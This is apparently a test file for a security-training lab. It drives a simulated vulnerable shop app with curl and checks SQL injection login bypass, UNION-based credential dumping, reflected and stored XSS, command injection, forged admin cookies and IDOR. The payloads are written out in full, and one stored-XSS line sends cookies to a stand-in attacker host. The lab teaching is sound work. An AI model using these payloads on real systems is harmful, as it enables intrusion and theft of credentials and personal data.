import test from 'node:test';
import assert from 'node:assert/strict';
import { makeShell } from './helpers.mjs';

// ShopZone (shop.acme.test, 10.10.20.9) exercised entirely through curl in the sandbox training-box shell.
// Every check here confirms the vulnerability the way a real tester would: by reading the response text,
// never by actually running injected script or shell commands against anything real.

test('home page lists products from the real SQL engine', async () => {
  const sh = makeShell();
  const out = (await sh.run('curl http://shop.acme.test/')).out;
  assert.match(out, /<h1>Welcome to ShopZone<\/h1>/);
  assert.match(out, /<a href="\/product\?id=1">Wireless Mouse<\/a> - \$19\.99/);
  assert.match(out, /Mechanical Keyboard/);
});

test('login: normal credentials work, wrong ones do not', async () => {
  const sh = makeShell();
  const good = await sh.run("curl -i -d 'username=alice&password=alice123' http://shop.acme.test/login");
  assert.match(good.out, /^HTTP\/1\.1 302 Found/);
  assert.match(good.out, /Location: \/account/);
  assert.match(good.out, /Set-Cookie: session=[0-9a-f]{24}; HttpOnly; Path=\//);
  const bad = await sh.run("curl -d 'username=alice&password=wrong' http://shop.acme.test/login");
  assert.match(bad.out, /Invalid username or password/);
});

test('A05 Injection: SQL login bypass via string concatenation', async () => {
  const sh = makeShell();
  // The payload closes the quoted string and comments out the password check entirely.
  const r = await sh.run(`curl -i -d "username=admin'-- &password=x" http://shop.acme.test/login`);
  assert.match(r.out, /^HTTP\/1\.1 302 Found/);
  assert.match(r.out, /Location: \/account/, 'logged in as admin without knowing the password');
  const cookie = /session=([0-9a-f]{24})/.exec(r.out)[1];
  const account = (await sh.run(`curl -b 'session=${cookie}' http://shop.acme.test/account`)).out;
  assert.match(account, /Welcome, admin/);
});

test('A05 Injection: a parameterised login is NOT bypassable by the same payload', async () => {
  // Sanity check on the *lesson*, not the app: the engine's bind() truly neutralises the payload.
  const { Database } = await import('../public/js/sim/sqlsim.js');
  const db = new Database({ tables: { users: { columns: ['id', 'username', 'password'], rows: [{ id: 1, username: 'admin', password: 'real-pass' }] } } });
  const safeSql = Database.bind('SELECT id FROM users WHERE username = ? AND password = ?', ["admin'-- ", 'x']);
  assert.equal(db.query(safeSql).rows.length, 0);
});

test('A05 Injection: UNION-based SQLi on /search extracts the users table', async () => {
  const sh = makeShell();
  const probe = await sh.run("curl -s 'http://shop.acme.test/search?q=mouse'");
  assert.match(probe.out, /Wireless Mouse/);
  // Find the column count first, the way a real tester would (ORDER BY n until it errors).
  const ok3 = await sh.run("curl -s 'http://shop.acme.test/search?q=zzz%27%20ORDER%20BY%203-- %20-'");
  assert.doesNotMatch(ok3.out, /Database error/);
  const fail4 = await sh.run("curl -s 'http://shop.acme.test/search?q=zzz%27%20ORDER%20BY%204-- %20-'");
  assert.match(fail4.out, /Database error/, 'there is no 4th column, so the query fails');
  // 3 columns confirmed -> pull username/password out through the union.
  // (double-quoted on the shell side: the payload itself contains a single quote, which would otherwise
  // end our own shell argument early — this is exactly the quoting trap real testers run into too)
  const payload = "zzz' UNION SELECT id, concat(username,':',password), 0 FROM users-- -";
  const dump = (await sh.run(`curl -s -G --data-urlencode "q=${payload}" http://shop.acme.test/search`)).out;
  assert.match(dump, /admin:Adm1n_P@ss_2024/);
  assert.match(dump, /alice:alice123/);
  assert.match(dump, /bob:Password1/);
});

test('A05 Injection: reflected XSS on /search is confirmed by an unescaped marker', async () => {
  const sh = makeShell();
  const marker = '<script>alert(1)</script>';
  const r = await sh.run(`curl -s -G --data-urlencode 'q=${marker}' http://shop.acme.test/search`);
  assert.match(r.out, /Search results for: <script>alert\(1\)<\/script>/, 'the payload appears verbatim, not HTML-encoded');
  assert.doesNotMatch(r.out, /&lt;script&gt;/, 'a safe app would have encoded it to &lt;script&gt;');
});

test('A05 Injection: stored XSS survives in every later view of the product page', async () => {
  const sh = makeShell();
  const payload = '<script>document.location="http://evil.test/steal?c="+document.cookie</script>';
  await sh.run(`curl -s -d 'product_id=2&author=shopper&body=${encodeURIComponent(payload)}' http://shop.acme.test/comments`);
  const page1 = (await sh.run('curl -s http://shop.acme.test/product?id=2')).out;
  assert.match(page1, /<strong>shopper<\/strong>: <script>document\.location="http:\/\/evil\.test\/steal\?c="\+document\.cookie<\/script>/);
  // and it is still there on a second, unrelated visit - this is what makes it "stored"
  const page2 = (await sh.run('curl -s http://shop.acme.test/product?id=2')).out;
  assert.match(page2, /document\.location/);
  // a comment on a different product is unaffected
  assert.doesNotMatch((await sh.run('curl -s http://shop.acme.test/product?id=1')).out, /evil\.test/);
});

test('A05 Injection: a safely-escaped comment does not reopen the payload', async () => {
  const sh = makeShell();
  await sh.run(`curl -s -d 'product_id=3&author=safe&body=plain%20review%2C%20no%20markup' http://shop.acme.test/comments`);
  assert.match((await sh.run('curl -s http://shop.acme.test/product?id=3')).out, /plain review, no markup/);
});

test('A05 Injection: command injection through the admin ping tool', async () => {
  const sh = makeShell();
  const denied = await sh.run("curl -i 'http://shop.acme.test/admin/diagnostics?host=127.0.0.1'");
  assert.match(denied.out, /^HTTP\/1\.1 403 Forbidden/, 'no admin cookie yet');
  const r = await sh.run("curl -s -b 'role=admin' -G --data-urlencode 'host=127.0.0.1; cat /var/www/html/flag.txt' http://shop.acme.test/admin/diagnostics");
  assert.match(r.out, /PING 127\.0\.0\.1/);
  assert.match(r.out, /FLAG\{command_injection_pops_the_shell\}/);
  const idOut = await sh.run("curl -s -b 'role=admin' -G --data-urlencode 'host=127.0.0.1; id; whoami' http://shop.acme.test/admin/diagnostics");
  assert.match(idOut.out, /uid=33\(www-data\) gid=33\(www-data\) groups=33\(www-data\)\nwww-data/);
  assert.doesNotMatch(idOut.out, /127\.0\.0\.1: not found/, 'the real ping target before the first ; is never re-run as a fake command');
  // an ordinary host with no metacharacters is just a normal ping, no injected output at all
  const clean = await sh.run("curl -s -b 'role=admin' -G --data-urlencode 'host=10.10.20.5' http://shop.acme.test/admin/diagnostics");
  assert.doesNotMatch(clean.out, /uid=|FLAG\{/);
});

test('A01 Broken Access Control: the admin check trusts a client-editable cookie', async () => {
  const sh = makeShell();
  // Nothing proves this cookie came from a real admin login - the app just reads it back.
  const r = await sh.run("curl -s -b 'role=admin' http://shop.acme.test/admin/diagnostics");
  assert.match(r.out, /Network diagnostics/);
  assert.doesNotMatch(r.out, /Forbidden/);
});

test('A01 Broken Access Control: IDOR lets any logged-in user read anyone\'s order', async () => {
  const sh = makeShell();
  const login = await sh.run("curl -i -d 'username=alice&password=alice123' http://shop.acme.test/login");
  const cookie = /session=([0-9a-f]{24})/.exec(login.out)[1];
  const own = (await sh.run(`curl -s -b 'session=${cookie}' http://shop.acme.test/account`)).out;
  assert.match(own, /Order #101/);
  assert.doesNotMatch(own, /Order #102/, "alice's own order list correctly does not mention bob's order");
  // changing the id in the URL reaches an order that is not hers at all
  const bobsOrder = (await sh.run(`curl -s -b 'session=${cookie}' http://shop.acme.test/account/order?id=102`)).out;
  assert.match(bobsOrder, /Customer: bob/);
  assert.match(bobsOrder, /99 Silom Rd, Bangkok \(Bob Anan\) - card ending 4471/, "alice can read bob's shipping address and payment hint");
});

test('A01 Broken Access Control: order lookup without being logged in redirects to login', async () => {
  const sh = makeShell();
  assert.match((await sh.run('curl -i http://shop.acme.test/account/order?id=101')).out, /^HTTP\/1\.1 302 Found\n[\s\S]*Location: \/login/);
});

test('session, product and 404 edge cases', async () => {
  const sh = makeShell();
  assert.match((await sh.run('curl -i http://shop.acme.test/account')).out, /^HTTP\/1\.1 302 Found\n[\s\S]*Location: \/login/);
  assert.match((await sh.run('curl -i http://shop.acme.test/product?id=999')).out, /^HTTP\/1\.1 404 Not Found/);
  const login = await sh.run("curl -i -d 'username=alice&password=alice123' http://shop.acme.test/login");
  const cookie = /session=([0-9a-f]{24})/.exec(login.out)[1];
  assert.match((await sh.run(`curl -i -b 'session=${cookie}' http://shop.acme.test/account/order?id=9999`)).out, /^HTTP\/1\.1 404 Not Found/, 'a logged-in user asking for an order id that does not exist at all');
  assert.match((await sh.run("curl -i -b 'session=not-a-real-token' http://shop.acme.test/account")).out, /^HTTP\/1\.1 302 Found/, 'an unknown session token is just not logged in');
  assert.match((await sh.run('curl -i http://shop.acme.test/nope')).out, /^HTTP\/1\.1 404 Not Found/);
  assert.match((await sh.run('curl http://shop.acme.test/robots.txt')).out, /Disallow: \/admin\//);
});

test('login session persists across requests and logout clears it', async () => {
  const sh = makeShell();
  const login = await sh.run("curl -i -d 'username=bob&password=Password1' http://shop.acme.test/login");
  const cookie = /session=([0-9a-f]{24})/.exec(login.out)[1];
  assert.match((await sh.run(`curl -s -b 'session=${cookie}' http://shop.acme.test/account`)).out, /Welcome, bob/);
  const out = await sh.run(`curl -i -b 'session=${cookie}' http://shop.acme.test/logout`);
  assert.match(out.out, /Set-Cookie: session=; Max-Age=0; Path=\//);
});

test('whatweb, nmap and nikto see ShopZone like any other site in the lab', async () => {
  const sh = makeShell();
  assert.match((await sh.run('whatweb shop.acme.test')).out, /Title\[ShopZone - Home\]|Title\[Home - ShopZone\]/);
  assert.match((await sh.run('nmap -sV -p80 10.10.20.9')).out, /80\/tcp open  http    Apache httpd 2\.4\.41 \(\(Ubuntu\)\)/);
});

test('an SQL syntax error from a broken payload surfaces as a realistic PHP/MySQL error page', async () => {
  const sh = makeShell();
  const r = await sh.run("curl -s -G --data-urlencode \"q=unterminated'\" http://shop.acme.test/search");
  assert.match(r.out, /Database error:/);
});

test("a login payload that breaks SQL syntax fails loudly (fatal error page), not silently", async () => {
  const sh = makeShell();
  const r = await sh.run(`curl -i -d "username=admin'&password=x" http://shop.acme.test/login`);
  assert.match(r.out, /^HTTP\/1\.1 500 Internal Server Error/);
  assert.match(r.out, /Uncaught mysqli_sql_exception/);
});
